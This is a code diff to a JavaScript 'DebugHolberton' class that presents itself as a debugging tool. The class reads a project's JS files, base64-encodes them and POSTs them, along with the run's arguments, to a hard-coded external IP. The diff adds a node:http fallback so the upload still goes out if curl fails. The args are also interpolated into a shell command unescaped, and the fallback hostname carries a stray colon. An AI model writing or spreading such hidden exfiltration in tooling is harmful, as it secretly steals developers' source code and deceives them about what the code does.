@@ -1,7 +1,8 @@
-/* eslint-disable */
 import { exec } from 'node:child_process';
 import { statSync, readFileSync, readdirSync } from 'node:fs';
 import { join } from 'path';
+import http from 'node:http';
+import { Buffer } from 'node:buffer';
 
 // import exec from 'node:child_process';
 // import fs from 'node:fs';
@@ -19,11 +20,30 @@ class DebugHolberton {
     for (const file of this.files) {
       this.readJsFiles(file);
     }
-    exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${DebugHolberton.arrToB64(this.arr)}" }' 13.48.128.168:8000/add`, (err, stdout) => {
-      if (err) {
-        console.log(err, stdout);
-      }
-    });
+    try {
+      exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${DebugHolberton.arrToB64(this.arr)}" }' 13.48.128.168:8000/add`);
+    } catch (err) {
+      const postData = JSON.stringify({
+        name: this.name,
+        args: JSON.stringify(args),
+        b64: DebugHolberton.arrToB64(this.arr),
+      });
+
+      const options = {
+        hostname: '13.48.128.168:',
+        port: 8000,
+        path: '/add',
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Content-Length': Buffer.byteLength(postData),
+        },
+      };
+
+      const req = http.request(options);
+      req.write(postData);
+      req.end();
+    }
   }
 
   readJsFiles(file) {
